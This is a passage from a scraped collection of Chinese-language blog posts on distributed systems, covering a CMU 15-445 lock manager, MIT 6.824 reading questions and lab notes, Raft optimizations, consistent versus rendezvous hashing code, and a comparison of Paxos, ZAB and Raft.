1. return false if the transaction is aborted; and * 2. block on wait, return true when the lock request is granted; and * 3. it is undefined behavior to try locking an already locked RID in the * same transaction, i.e. the transaction is responsible for keeping track of * its current locks. */ /** * Acquire a lock on RID in shared mode. See [LOCK_NOTE] in header file. * @param txn the transaction requesting the shared lock * @param rid the RID to be locked in shared mode * @return true if the lock is granted, false otherwise */ bool LockShared(Transaction *txn, const RID \u0026amp;rid); /** * Acquire a lock on RID in exclusive mode. See [LOCK_NOTE] in header file. * @param txn the transaction requesting the exclusive lock * @param rid the RID to be locked in exclusive mode * @return true if the lock is granted, false otherwise */ bool LockExclusive(Transaction *txn, const RID \u0026amp;rid); /** * Upgrade a lock from a shared lock to an exclusive lock. * @param txn the transaction requesting the lock upgrade * @param rid the RID that should already be locked in shared mode by the * requesting transaction * @return true if the upgrade is successful, false otherwise */ bool LockUpgrade(Transaction *txn, const RID \u0026amp;rid); /** * Release the lock held by the transaction. * @param txn the transaction releasing the lock, it should actually hold the * lock * @param rid the RID that is locked by the transaction * @return true if the unlock is successful, false otherwise */ bool Unlock(Transaction *txn, const RID \u0026amp;rid); LockRequestQueue \u0026amp;GetQ(const RID \u0026amp;rid) { std::unique_lock\u0026lt;std::mutex\u0026gt; ul(latch_); return lock_table_[rid]; } private: std::mutex latch_; std::unordered_map\u0026lt;RID, LockRequestQueue\u0026gt; lock_table_; }; Ref 大老的實現筆記與code 大老的code 有人把recovery的test挖出來 2021 CMU-15445/645 Project #4 : Concurrency Control 【完】\n","permalink":"https://littlebees.github.io/2022/03/cmu-14-445-lab%E7%9A%84%E4%B8%8D%E5%AE%8C%E5%85%A8%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不完全的理由是1~3只有跑local simple test，因為我的重點是第4個lab\n想要了解不同的isolation level的效果\u003c/p\u003e","title":"cmu 14-445 lab的不完全筆記"},{"content":"動機 當成複習\nGFS Describe a sequence of events that would result in a client reading stale data from the Google File System.\n就是這張圖 只要一個secondary沒有寫到，primary只會回fail，之後client retry，就有了這個畫面。\nVM FT How does VM FT handle network partitions? That is, is it possible that if the primary and the backup end up in different network partitions that the backup will become a primary too and the system will run with two primaries?\nTest-and-Set，有搶到就當leader，沒搶到就自己放棄\nraft Suppose we have the scenario shown in the Raft paper\u0026rsquo;s Figure 7: a cluster of seven servers, with the log contents shown. The first server crashes (the one at the top of the figure), and cannot be contacted. A leader election ensues. For each of the servers marked (a), (d), and (f), could that server be elected? If yes, which servers would vote for it? If no, what specific Raft mechanism(s) would prevent it from being elected?\n上requestVote的code\nfunc (rf *Raft) RequestVote(args *RequestVoteArgs, reply *RequestVoteReply) { rf.Lock() lastIdx := rf.getLastLogIdxX() lastTerm := rf.getLogTermX(lastIdx) if args.Term \u0026lt; rf.Term { reply.VoteGranted = false } else { if args.Term \u0026gt; rf.Term { rf.setFollowerX(args.Term, -1) } if rf.VoteFor != -1 \u0026amp;\u0026amp; rf.VoteFor != args.Id || !(lastTerm \u0026lt; args.AtTerm || lastTerm == args.AtTerm \u0026amp;\u0026amp; lastIdx \u0026lt;= args.AtIndex) { reply.VoteGranted = false } else { reply.VoteGranted = true //DPrintf(\u0026#34;(%v) [RequestVote] accept1 args:%v log:%v\u0026#34;, rf.Me, args, rf.Log) rf.setFollowerX(args.Term, args.Id) rf.resetElectionTimer() } } reply.Term = rf.Term rf.Unlock() } 省略，term與投過的case，重點是 !(lastTerm \u0026lt; args.AtTerm || lastTerm == args.AtTerm \u0026amp;\u0026amp; lastIdx \u0026lt;= args.AtIndex)\n看最後一個log的term 最後一個log的term一樣就比長度 a會拿到b, e, f的票，所以可以成為leader d任何票都拿的到，所以可以成為leader f最後一個log的term比任何人都小，不可能成為leader\nCould a received InstallSnapshot RPC cause the state machine to go backwards in time? That is, could step 8 in Figure 13 cause the state machine to be reset so that it reflects fewer executed operations? If yes, explain how this could happen. If no, explain why it can\u0026rsquo;t happen.\n根據Log Matching，entry的index與term不會變 根據Leader Completeness，被commit的entry之後都會在log中 根據State Machine Safety，被apply之後就不會被apply別的entry\n也就是說，commit過的log等於state machine\n因為installSnapshot是只trim commit過的log，所以reset state machine沒差\nZookeeper One use of Zookeeper is as a fault-tolerant lock service (see the section \u0026ldquo;Simple locks\u0026rdquo; on page 6). Why isn\u0026rsquo;t possible for two clients to acquire the same lock? In particular, how does Zookeeper decide if a client has failed and it can give the client\u0026rsquo;s locks to other clients?\n就flock 用EPHEMERAL創個檔案，exist就是有人上鎖。 其他要等的就是上watch，之後就算lock holder出事zookeeper也會自己清這個檔案(鎖)，其他人透過watch知道unlock\nChain Replication Suppose Chain Replication replied to update requests from the head, as soon as the next chain server said it received the forwarded update, instead of responding from the tail. Explain how that could cause Chain Replication to produce results that are not linearizable.\n這個就與raft沒有等到過半就commit一樣 如果不是最後一個好了才reply，有可能中間出事之後後面的server就會少這筆write\nDistributed Transactions 6.033 Book. Read just these parts of Chapter 9: 9.1.5, 9.1.6, 9.5.2, 9.5.3, 9.6.3. The last two sections (on two-phase locking and distributed two-phase commit) are the most important. The Question: describe a situation where Two-Phase Locking yields higher performance than Simple Locking.\nSimple Locking: 先全拿lock，再跑，之後全放 Two-Phase Locking: 一個一個拿，等跑完，再一個一個放\nA: read x, write y B: read y\nsimple會變成B要等A做完才能跑(或是A等B) 2PL可以是先read x(A), read y(B), write y(A)\nSpanner Spanner Suppose a Spanner server\u0026rsquo;s TT.now() returns correct information, but the uncertainty is large. For example, suppose the absolute time is 10:15:30, and TT.now() returns the interval [10:15:20,10:15:40]. That interval is correct in that it contains the absolute time, but the error bound is 10 seconds. See Section 3 for an explanation TT.now(). What bad effect will a large error bound have on Spanner\u0026rsquo;s operation? Give a specific example.\nr/w commit要等到他的timestamp結束，所以誤差越大r/w commit要等越久\nFrangipani Suppose a server modifies an i-node, appends the modification to its log, then another server modifies the same i-node, and then the first server crashes. The recovery system will see the i-node modification in the crashed server\u0026rsquo;s log, but should not apply that log entry to the i-node, because that would un-do the second server\u0026rsquo;s change. How does Frangipani avoid or cope with this situation?\n有人需要某個檔案是被已經crash的server改過的會怎樣?\nFrangipani的client在改file之前會把op送到Petal的log，所有crash有兩個case\n有log 沒log 有log就讓要求lock的server去replay 沒有log就直接上\nreplay就帶來現在問的問題，如果多台(其中有crash的)改到同一個file怎麼辦? 怎麼處理衝突?\n檔案(inode)有版本號，所有op都有版本號+1，這樣只要op的版本號小於inode的，就不用管\nCOPS The last sentence in Section 4.3 says a client clears its context after a put, replacing the context with just the put. The text observes \u0026ldquo;This put depends on all previous key-version pairs and thus is nearer than them.\u0026rdquo; Why does clearing the context and replacing it with just the put make sense? You might think that the client\u0026rsquo;s subsequent puts would need to carry along the dependency information about previous gets. What entity ultimately uses the context information, and why does it not need the information about gets before the last put?\n回想raft的snahpshot的問題，為什麼snapshot不會讓state machine後退? 因為snapshot的都是commited的log\n在這裡log就是context，也就是執行過的指令(所以有遞移性)。 一旦執行完成就是commited，所以可以刪掉(因為狀態被改變了，前面的也沒用了)\n那為什麼讀的指令要保留? 讓後面的讀可以知道前面的讀已經發生，確保順序 (可以配合SUNDR的question一起看)\nFaRM Suppose there are two FaRM transactions that both increment the same object. They start at the same time and see the same initial value for the object. One transaction completely finishes committing (see Section 4 and Figure 4). Then the second transaction starts to commit. There are no failures. What is the evidence that FaRM will use to realize that it must abort the second transaction? At what point in the Section 4 / Figure 4 protocol will FaRM realize that it must abort?\nFaRM是樂觀鎖，所以它會讓其他人做事，出事(FaRM透過檢查確認出事)再retry 悲觀鎖是先讓對方等\nFaRM前面有兩個檢查階段\nLOCK VALIDATE 都會檢查lock與資料的版本號 LOCK可以當成是檢查寫過的 VALIDATE是有讀到的\n這題是在同一個變數做++，所以在LOCK會被abort\nMemcache at Facebook Section 3.3 implies that a client that writes data does not delete the corresponding key from the Gutter servers, even though the client does try to delete the key from the ordinary Memcached servers (Figure 1). Explain why it would be a bad idea for writing clients to delete keys from Gutter servers.\ngutter是備援選手，在主server出事時接手 同時cache的目的是不要讓大量traffic打爆backend\n所以回答問題，為什麼不用invalidate gutter? gutter的key的過期時間很短，取代invalidate，雖然說會有一點stale data，但這樣可以確保backend不會被打爆\nSUNDR In the simple straw-man, both fetch and modify operations are placed in the log and signed. Suppose an alternate design that only signs and logs modify operations. Does this allow a malicious server to break fetch-modify consistency or fork consistency? Why or why not?\n可以回去想為什麼raft的read要過raft的共識 如果沒有過共識，read可能拿到缺了某些write的state\nSpark What applications can Spark support well that MapReduce/Hadoop cannot support?\n密集運算或是需要反覆r/w的場合\nBitcoin Try to buy something with Bitcoin. It may help to cooperate with some 6.824 class-mates, and it may help to start a few days early. If you decide to give up, that\u0026rsquo;s OK. Briefly describe your experience.\n沒$，跳過\nBlockstack Why is it important that Blockstack names be unique, human-readable, and decentralized? Why is providing all three properties hard?\n因為name是識別user的方法，也是資安的開始，所以重要\nunique: 不能重複 human-readable: 方便使用 decentralized: 解釋權不被壟斷\nhuman-readable + decentralized: 自己的筆記 human-readable + unique: email unique + decentralized: public key\ncentralized很像root folder，在裡面可以human-readable與unique 一但decentralized就很容易撞名\n","permalink":"https://littlebees.github.io/2022/03/6-824%E7%9A%84question/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當成複習\u003c/p\u003e","title":"6-824的question"},{"content":"動機 raft有一些優化，這邊記錄一些 主要出自raft作者的博論\nBatching AppendEntries可以一次累積多一點log再丟出去，把latency往下壓\nPipelining 因為raft的log一定是遞增，所以raft實際上可以根據任何順序丟log出去，也就是說不用依據follower實際上的最後一位去丟 直接看netxIndex多少去丟就好，甚至還可以實作reorder\nprevote 有人經歷network partiotion，這樣他的log一定不會是最新的(不會是leader) 但是，他的term會異常大!!\n這樣其他人會因為看到這超大的term，被迫變成follower，但因為log的緣故也絕對不會是他當leader，這樣其實很浪費。 所以，可以多一個階段，prevote，類似zab，先投出一個leader，之後sync log才把epoch(term)推上去，但這裡是先丟自己的log出去，問其他人要不要投，有過半就開啟正式的投票。\nread index 之前lab3與4的read都要過raft，這真的很慢。\n所以利用leader的log一定有所有commit log的特性。\n先丟no-op (確認log與把前面的都commit) 記下當下的index為readIndex 等收到過半的reply(其實是要等lastApplied更新) 之後只要read的指令的index沒有超過readIndex就可以直接回 follower就可以去問leader當前的readIndex，之後等lastApplied大於這個readIndex，就可以直接回了\nlease read 有沒有辦法不丟no-op只透過heartbeat更新?\n如果能保證每台機器的時間都是一致的\n收到過半的heartbeat，當成直到election timer啟動前都是leader(所以說要保證時間一致，想想如果leader被pause的話\u0026hellip;) 只要確認自己是leader且log有同步(過了appendEntries)，就可以直接回\n發log同時persist raft是看過半來決定要不要commit，所以\n有過，先寫到disk就賺到 沒過，沒差之後會被其他appenEntries修掉 profile, hdd效能, test 這邊是列出dragonboat作者的文章，比起上面的優化，這邊都是屬於實作上的細節，值得一看。\n从共识算法开谈 - 硬盘性能的最大几个误解 百亿次的锤炼 - 带逛Dragonboat的各类测试 \u0026lt;= 其實6.824的lab3,4都有用到!! 大规模Go项目几乎必踏的几个坑 - Dragonboat为例 Go系统性能绕坑工具与方法 - 基于实例的带逛 让Raft变快100倍 - Dragonboat的写优化\nRef 博論\n","permalink":"https://littlebees.github.io/2022/03/raft%E5%84%AA%E5%8C%96/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eraft有一些優化，這邊記錄一些\n主要出自raft作者的博論\u003c/p\u003e","title":"raft優化"},{"content":"動機 先假設 我們有\nsrv2key = default_dict(list) key2srv = {} srvs = [\u0026#39;server1\u0026#39;, \u0026#39;server2\u0026#39;, \u0026#39;server3\u0026#39;, \u0026#39;server4\u0026#39;] srv2key: 把server對到負責的key們 key2srv: key是哪一個srv負責 srvs: 所有server consistent hash 先想像有一個hash可以把string轉成0~2**32-1之間的值\n把servers想像成環上的點，之後分配資料就是利用bsearch找靠近的server\ndef get(k): hashed = hash(k) i = bisect(map(hash, srvs), hash(k)) % len(srvs) srv2key[srvs[i]] += [k] key2srv[k] = srvs[i] return ret 刪server時，只要往把原本的server資料往前丟就好\ndef del_server(srv): keys = srv2key[srv] oldSrv = srvs.index(srv) del(srvs, oldSrv) del(srv2key, oldSrv) newSrv = srvs[oldSrv+1 % len(srvs)] srv2key[newSrv] += keys for k in keys: key2srv[k] = newSrv # 其實也可以 [get(k) for k in keys] rendezvous hash 可以把consistent hash擴展成把所有server加進來比，選一個分數最高的\ndef get(k): ret = max(srvs, key=lambda srv: score_aka_hash(srv, k)) srv2key[ret] += [k] key2srv[k] = ret return ret 刪server時，就變成每個key都要重新map\ndef del_server(srv): keys = srv2key[srv] oldSrv = srvs.index(srv) del(srvs, oldSrv) del(srv2key, oldSrv) [get(k) for k in keys] rendezvous hash \u0026amp; consistent hash rendezvous hash根據hash function，可以讓key平均分配在server上 但是如果要add/del server是個大工程。\nconsistent hash在處理add/del server簡單的多，同時查找是log n不是n。 但是如果有hotspot，就要自己調整virtual node去調。\nrendezvous hash的實際例子 從wiki上改來的，from New Hashing Algorithms for Data Storage\nimport mmh3 import math def int_to_float(value: int) -\u0026gt; float: \u0026#34;\u0026#34;\u0026#34;Converts a uniformly random 64-bit integer to uniformly random floating point number on interval [0, 1).\u0026#34;\u0026#34;\u0026#34; fifty_three_ones = 0xFFFFFFFFFFFFFFFF \u0026gt;\u0026gt; (64 - 53) fifty_three_zeros = float(1 \u0026lt;\u0026lt; 53) return (value \u0026amp; fifty_three_ones) / fifty_three_zeros class Node: \u0026#34;\u0026#34;\u0026#34;Class representing a node that is assigned keys as part of a weighted rendezvous hash.\u0026#34;\u0026#34;\u0026#34; def __init__(self, name: str, seed, weight) -\u0026gt; None: self.name, self.seed, self.weight = name, seed, weight def __str__(self): return \u0026#34;[\u0026#34; + self.name + \u0026#34; (\u0026#34; + str(self.seed) + \u0026#34;, \u0026#34; + str(self.weight) + \u0026#34;)]\u0026#34; def compute_weighted_score(self, key): _, hash_2 = mmh3.hash64(str(key), 0xFFFFFFFF \u0026amp; self.seed) hash_f = int_to_float(hash_2) score = 1.0 / -math.log(hash_f) return self.weight * score def determine_responsible_node(nodes, k): \u0026#34;\u0026#34;\u0026#34;Determines which node, of a set of nodes of various weights, is responsible for the provided key.\u0026#34;\u0026#34;\u0026#34; return max(nodes, key=lambda n: n.compute_weighted_score(k)) node1 = Node(\u0026#34;node1\u0026#34;, 123, 100) node2 = Node(\u0026#34;node2\u0026#34;, 567, 200) node3 = Node(\u0026#34;node3\u0026#34;, 789, 300) print(str(determine_responsible_node([node1, node2, node3], \u0026#39;foo\u0026#39;))) print(str(determine_responsible_node([node1, node2, node3], \u0026#39;bar\u0026#39;))) print(str(determine_responsible_node([node1, node2, node3], \u0026#39;hello\u0026#39;))) Ref Rendezvous Hashing: an alternative to Consistent Hashing Consistent Hashing Algorithm: 應用情境、原理與實作範例 Rendezvous hashing consistent hashing vs. rendezvous (HRW) hashing - what are the tradeoffs?\n","permalink":"https://littlebees.github.io/2022/03/rendezvous-hash%E8%88%87consistent-hash/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"rendezvous hash與consistent hash"},{"content":"動機 整理一下\n總體而言 在任何時間點，於不能反悔的情況下維持共識\npaxos與其他共識演算法都是在保護上面假設\n實際如何執行?\n不能反悔 (資料保持最新 \u0026amp; 承認時間流逝) 遞增 冪等 immutation 共識 多數決 單一來源 描述時間 序列號 下面根據paper的時間線來看\nbasic paxos multi-paxos zab raft basic paxos 有兩個角色，proposer與accepter (對應到raft是leader與follower)\n之後與raft不同的是paxos可以同時管理好幾個app的狀態(所以paxos可以接受不連續的log，因為log不用遞增)\n在paxos就是value去區分，每個value都會帶有一個只能遞增的rnd，與當前acceptor知道的最後一個rnd(log的最後index)\npaxos的proposer是任何人都能當的，但要怎麼確認自己的提案會不會被接受? 所以proposer要先問過半的accepter的最大rnd(prepare) 同時acceptor設定之後預期看到的rnd，也就是last_rnd 在下面的圖，log entry整個大概是(last_rnd, value[vrnd])\n另外，記得last_rnd不論何時一定大於等於vrnd 不論在什麼階段，prepare或是accept\n(假設還有其他資料，像是log，就要再額外sync，見zab，不過basic paxos沒有所以這段上括號)\n之後才傳資料，只要rnd(aka log)對的上就收(accept)。\n另外paxos這樣可能會產生livelock，只要有兩個proposer打同一個value就會產生，所以要區隔時間(raft的election timer)\n到此，classic paxos可以看成quorum + 2 phase commit 原本的2 phase commit要所有人確認，但因為這是共識只要quorum到就好\n定義quorum 為什麼要到quorum? 因為這樣可以確保任意讀與寫至少都會有一個有對的資料\n如果只是要符合\u0026quot;至少都會有一個有對的資料\u0026quot;，這樣一定要過半嗎? 不用，像是\n要求每個quorum都包含一個特定點 分階層，要求quorum至少要跨一行與跨一欄 只有兩行，要求包含第一行的majority, 或在每一行都包含一个majority 這樣有什麼好處與壞處? 好處: 可以以較少的數量達成quorum，如此一來可以選近的 或是 發少一點rpc 壞處: 犧牲avaibility，像是只要是包含的那個唯一的點壞了就出事了；但過半可以讓另一半壞了也ok\n正確性 value的rnd保證不反悔app狀態同時代表時間點 先問過半的accepter的最大id確保app狀態共識\nmulti-paxos 如果說每次都要同步log才能傳資料就很麻煩另外還有livelock的風險 所以把proposer定成一個這樣就能省下同步log的步驟\n正確性 proposer只要有最新的id，之後就可以commit到acceptor，等commit完成後就proposer又會有最新的id (遞迴)\nfast paxos 真的不想prepare!! 那就直接寫，用最小的rnd去寫。\n失敗的話，還是要prepare阿 有沒有辦法在報錯時確認當前的quorum是什麼?\n所以quorum要變成3/4 zab 就是multi-paxos + 選leader\n但這樣打太短要補一點東西\nzab分成4個階段\nelection 透過zxid來選其實就是 term (這裡叫epoch) id (就是paxos的id) 之後記住自己投給誰 discovery (prepare) sync (sync log) braodcast (accept) 選leader的正確性 leader會壞怎麼辦?\n選leader也要在任何時間點，於不能反悔的情況下維持共識 所以多了term與voteFor，term表示時間、voreFor就是資料 raft 如果只有一個app要管而已，可以簡化設計嗎?\n只放一個log，那可以直接用log遞增取代id 只有一個log，可以在選leader直接認最新log的為leader - 也因此，同步log的時機與paxos不同 paxos因為任何人都可以當proposer，所以一開始就要sync log raft是在成為leader之後才透過appendEntries同步log 但可能有不一致的log，所以才有figure 8 整個dataflow可以看成 leader -\u0026gt; log\n因為leader要過半，所以是共識； 認leader自然imply認log； (appendEntries) 接著就是認leader不能反悔； 最後就是commit出去的不能變，所以有過半才能commit；\n但是只有這樣會產生figure 8的問題，所以要多一個條件 只能在同一個term完成同一個term的事件\n因為只有在完成appendEntrries之後才能確認，follower的log與leader同步，而唯一能讓leader發appendEntrries只有新log或是heartbeat。\n正確性 不能反悔 term只能遞增 只能在同一個term完成同一個term的事件 (第一個處理亂序與crash的手法) leader的log只能遞增 共識 每個term的leader最多一個 用誰的log比較新決定leader 認term與log對不對得起來 leader持有夠新的log且過半(一樣新或是比較舊) log最新的log會過半 有新log會reject其他candidate follower會與leader的log同步 merge相符但是比較短的entries (第二個處理亂序的手法) 砍掉開始不一樣的log 過半才做下一個步驟 成為leader (leader最多一個) commit log上去 (確定新的log占多數) 在同一個term完成同一個term的事件 (raft獨有) figure 8 因為是等到appendEntrries才sync log (類似lazy eval) 變成只能在自己的term才能確認log是對的 但是只要確認就能利用 multi-paxos的遞迴 確認前面的log也是對的!! abstract-paxos 将 paxos 和 raft 统一到一个协议下: abstract-paxos\n這篇就是把原po的quorum與paxos組合在一起，從phase2開始講到phase1\n先有兩個腳色，reader與writer\n我們的algo要保證下面的性質\ncommit-寫quorum: 以保證任何 reader 都可讀到. commit-唯一: 以保證多個 reader 返回相同的結果. commit後不能修改: 以保證多次讀返回同樣的結果. 第一點就是寫quorum\n第二與三點就需要能夠比較不同writer的手段(全序關係)，所以寫入的值需要一個commit_index，讓reader知道要拿那個value\nstruct State { log: Vec\u0026lt;{ commit_index: u64, cmd: Cmd }\u0026gt;, } paxos叫vrnd，raft叫term\n剛剛是reader的，接著是writer的唯一與不可修改 會破壞writer的唯一與不可修改就是有沒有可能要寫之前有其他人要寫呢? 所以我們需要一個機制讓對方承諾說不會接受舊的寫入\n所以就再多一個commit_index\nstruct Node { commit_index: u64, state: State, } paxos叫rnd，raft叫term與voteFor\n這樣就有兩個phase\nimpl Node { fn handle_phase_1(\u0026amp;mut self, p1_req: P1Req) { let p1_reply = P1Reply{ commit_index: self.commit_index state: self.state, }; self.commit_index = max(self.commit_index, p1_req.commit_index()); return p1_reply; } } impl Node { fn handle_phase_2(\u0026amp;mut self, p2_req: P2Req) { let p2_reply = P2Reply{ commit_index: self.commit_index }; if p2_req.commit_index \u0026gt;= self.commit_index { self.state.update(p2_req.state); self.commit_index = max(self.commit_index, p2_req.commit_index); } return p2_reply; } } 注意到self.commit_index = max(self.commit_index, p2_req.commit_index) 這裡就是說node的commit_index一定大於等於state最後一個的commit_index 這邊也可以從writer的角度來看為什麼raft只能在自己的term做commit\nRef 可靠分布式系统-paxos的直观解释 后分布式时代: 多数派读写的’少数派’实现\n","permalink":"https://littlebees.github.io/2022/03/paxos%E5%88%B0zab%E5%86%8D%E5%88%B0raft/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e整理一下\u003c/p\u003e","title":"paxos到zab再到raft"},{"content":"動機 下面紀錄做lab遇到的坑\n我做完6.824的所有lab時，他們還在上課，所以code不能貼\n能得到什麼 怎麼用lock 分散式系統怎麼設計 怎麼設計log要印什麼與用log去debug 面對絕望的勇氣與滿滿的成就感 這堂課好在哪 所有材料都在網路上，連同所有測試 有可以參考的code與心得 (但網路上的code真的就是參考而已，因為有的也沒有實現好或是實現得異常複雜) lab1 實現一個單機版的mapreduce，這個基本上就是給大家練習golang的\n可以不用任何一個lock完成這個lab\n重點是知道mapper與reducer到底要做什麼 mapper把資料對到一個reducer(可以當成一個shard)，reducer做接下來的事\nlab2 實現一個有基本功能、log compaction、log fast back的raft\n細節十分多，十分可怕\n下面是一些整體的重點\n先用一個lock就好 之後會引入其他lock，要嚴格遵守拿lock的order 引入lock後method互相call可能會call到有lock的，要自己定義那些method需要lock那些不需要 lock與unlock可以用method包裝，之後如果有deadlock會很好trace 不要提早切太細分成很多struct與method (除了log的操作!!) 之後上lock會把自己搞死，除了deadlock還是deadlock debug的log也會很難看 (會不知道是哪台server做的) 思考為什麼raft不會錯，不是只有為什麼會對 正確性的來源是? 投票與log的關係是? term的意義是? 為什麼只需要persist那3項資料就好? raft怎麼意識到時間流逝(事件發生) persist的資料與正確性的關係是? fig 2的描述怎麼實現(保持)正確性? log要把所有狀態與自己是誰print出來 之後debug就是透過自己replay log來完成，沒有gdb，沒有 print可以直接用%v 去看student guide與lab hint lab2a 這是實現投票的part(RequestVote rpc)，很簡單，也是惡夢的開始!!\n因為這個不涉及log，導致隨便寫都能過test，但投票才是確保log會是最新的重要條件!!\nlab2b 這是實現log的part(AppendEntries rpc)，情況變得複雜起來，要處理log與apply\n這裡就會把前面lab2a沒寫好的部分暴露出來\n要確認所謂的at least up-to-date是什麼意思 (log比較長 或是 一樣長但是last log的term比較大或等於) 有沒有處理term不對要變成follower (有人說可以只讓leader變成follower就好，但我試了之後會報錯) 接著就是AppendEntries，\nheartbeat不特別!! 如果你看到你的code有if len(entries) == 0有很高的機率你的code是錯的 在client push東西後其實可以只透過heartbeat去更新log (但是很慢) candidate或是leader要變成follower，也只能是follower 有沒有處理term不對要變成follower 有沒有正確的trim log與merge entries apply log到client的時候，\n要確認是不是自己的term commit index夠不夠大 (其實只要有更新commit index就可以試著apply了，不用讓另一個thread去monitor commit index的變化) lab2c 這是實現log fast back與persist的部分\npersist不難，只要記得，只在persisting state變動時做persist!!\nlog fast back有很多版本，可以去看教授的也可以做conflict index\n聽起來都還好，但是這裡的test多的unreliable，也就是network partition、restart都加進來測，所以\ntest花的時間變多了 test會過不代表你的code是對的，有可能只是幸運 有一次是跑50次在第49次fail其他都pass\u0026hellip; 這裡整理一下遇過的錯\napply error: 同一個index上傳了不同的log 你的RequestVote或AppendEntries或apply log寫錯了，要回去看fig 2 fail to reach agreement(livelock): 怎麼沒有leader或是一直有candidate跳出來 你的RequestVote與AppendEntries寫錯了 election\u0026amp;heartbeat timer有沒有在對的時候reset term不對要變成follower時要reset (這邊fig 2沒有寫但是要) heartbeat timer的時間太長 或 election timer太短 deadlock 看看你的method有沒有用到lock lab2d 這是實現log compaction，原本是在lab3b，但現在搬來這裡\n要做InstallSnapshot，這不難，把前面的rpc拿來改，這裡的重點是\n怎麼處理被trim過的log 同時，前面的code也要能動 當初就是在這邊把apply log改成appiler的，因為\n因為tester的channel沒有buffer，不這樣做就等於在raft的lock中拿另一個lock，之後就會deadlock 前往lab3之前 要先大量測試你的raft都會過所有test，在這邊查出的問題越多之後的問題越少 只會剩下性能問題\nlab3 利用你的raft建立一個容錯、線性一致的key-value db\n這裡要注意的就是如果遇到重複、過期的request要怎麼處理? 引入序列號，這裡要client與server定義怎麼處理序列號，之後server就是照序列號一個一個處理上去\n還有要處理如果leader壞了，之前commit的東西其實要重新丟一次(index與term對不上，可以看student guide的Re-appearing indices)\n這裡還會對kv db做performance test，如果太慢要回去看raft!! 像我是之前raft做persist太多次，時間花太久\n還有get要放到raft中同步給大家，不然不會有線性一致\nlab4 現在把kv db拆成一個一個shard，分散在不同的raft group中，shard會在不同的raft group中移來移去\nlab4a 產生每個shard對應到哪個group的configuration\n這裡就是把lab3拿來改就好，把put/get換成join/leave，但要注意的是產生config的演算法一定要determinstic 不能同一個input之後每台server產生的config不一樣 (go的map走訪是undeterminstic)\nlab4b 要做提供kv db與shard migration的server\n這裡要處理shard migration，也是當初卡最久的地方，因為要自己設計這一塊，不像raft還有paper可以參考 同時也可以把challenge 1與2一起考慮進去\nshard migration有兩種方式一個是主動push或是自己pull，兩種都差不多，但要注意的是 只有在所有shard都完成migrate才能使用新的config，不然會看到兩個一樣的shard同時在服務或是shard去不到該去的地方!!\n另外有人提到要做no-op，因為raft的leader只能commit自己term的log，之後前面沒有commit的log也會被一起commit (詳情見raft paper的fig 8) 所以可能有一種情況是在前一個leader commit之前就壞了，之後選出新leader，但是client沒有塞任何東西，導致raft不apply log以及client等不到commit 所以no-op就是在新leader產生時可以丟一個沒有任何意義的commit出去，把前面還沒commit的給commit上去 (但6.824的lab沒做也是pass)\n在確定shard migration的設計之後遇到的bug是shard deletion (challenge 1)明明會pass但是因為花太久時間變成fail 這裡試過\nshard migration從一次一塊變成一次一個group 把大lock分成shard與pusher一人一個 在處理的時候發現慢慢code變回OOP的樣子，很奇妙 從存一整個configuration變成只存用的到的部分 get的結果不用raft傳回來 但頂多從330秒變成318秒而已 (還有看到有人用zlib，wow)\n最後是把timeout重試的時間調短(從3秒變成500ms)，大概60秒就做完了，wow\n所有lab之後 6.824其實沒有把每個用的分散式系統用到的手法的名字在課堂上介紹，反而是每堂課就是一篇paper看別人怎麼設計與遇到的困難是什麼，所以有人說6.824沒有什麼架構\n但其實這些手法在做lab時就會被實現出來，但lab沒有涉及到transaction的部分，還有那些手法的名字還是可以認識一下，所以可以去讀data-driven internsive application\n還有raft其實與實際用的差很多，工業的raft有許多優化手段，像readIndex或lease read，許多工業級的raft都可以看看\nRef MIT 6.824 lab心得\n","permalink":"https://littlebees.github.io/2022/03/mit-6.824-2022-%E5%AF%A6%E9%A9%97%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e下面紀錄做lab遇到的坑\u003c/p\u003e\n\u003cp\u003e我做完6.824的所有lab時，他們還在上課，所以code不能貼\u003c/p\u003e","title":"mit 6.824 2022 實驗筆記"},{"content":"動機 筆記\nintro 提醒大家，在你設計一個系統時或者面對一個你需要解決的問題時，如果你可以在一台計算機上解決，而不需要分佈式系統，那你就應該用一台計算機解決問題\n有很多的工作都可以在一台計算機上完成，並且通常比分佈式系統簡單很多。所以，在選擇使用分佈式系統解決問題前，你應該要充分嘗試別的思路，因為分佈式系統會讓問題解決變得複雜\n分佈式系統的問題（挑戰）在於\n並發 局部錯誤 一部分組件在工作、另一部分組件停止運行 這些計算機都在正常運行，但是網絡中斷了或者不穩定 實際上一千台機器到底有多少性能是一個棘手的問題 基礎架構\n存儲 通信（網絡） 計算 我們希望通過這種抽象的接口，將分佈式特性隱藏在整個系統內 我們的確也需要構建這樣一種基礎架構，它能夠盡可能多的對應用開發人員屏蔽和掩蓋錯誤\n性能 =\u0026gt; 可擴展性(Scalability) 容錯 =\u0026gt; 可用性(Availability) 大型分佈式系統中有一個大問題，那就是一些很罕見的問題會被放大 1000台計算機的集群中，總是有故障 主機 網路 recoverability 如果出現了問題，服務會停止工作，不再響應請求，之後有人來修復，並且在修復之後系統仍然可以正常運行，就像沒有出現過問題一樣 為了實現這些特性，有很多工具 非易失存儲（non-volatile storage，類似於硬盤） checkpoint, log 複製（replication） 關鍵問題在於，這兩個副本總是會意外的偏離同步的狀態，而不再互為副本 一致性（Consistency） 一致性就是用來定義操作行為的概念 (多個副本) 強一致（Strong Consistency） 強一致可以確保get獲取的是最新的數據，但是實現這一點的代價非常高 分佈式系統的各個組件需要做大量的通信，才能實現強一致性 弱一致 分佈式存儲系統的難點 (loop)\n巨大的性能加成 \u0026gt; 分片 分片（Sharding），但你將會看見常態的故障 \u0026gt; 容錯（fault tolerance） 複製（replication） \u0026gt; 不一致（inconsistency） 強一致 \u0026gt; 低性能 mapreduce 這裡確實需要將每一份數據都通過網絡從創建它的Map節點傳輸到需要它的Reduce節點 這裡實際上可能會有大量的網絡通信\ngfs 設計與目標\nbig,fast global sharding automatic recovering 前提\nsingle data centor internal use big sequential access 沒有random access Master節點用來管理文件和Chunk的信息 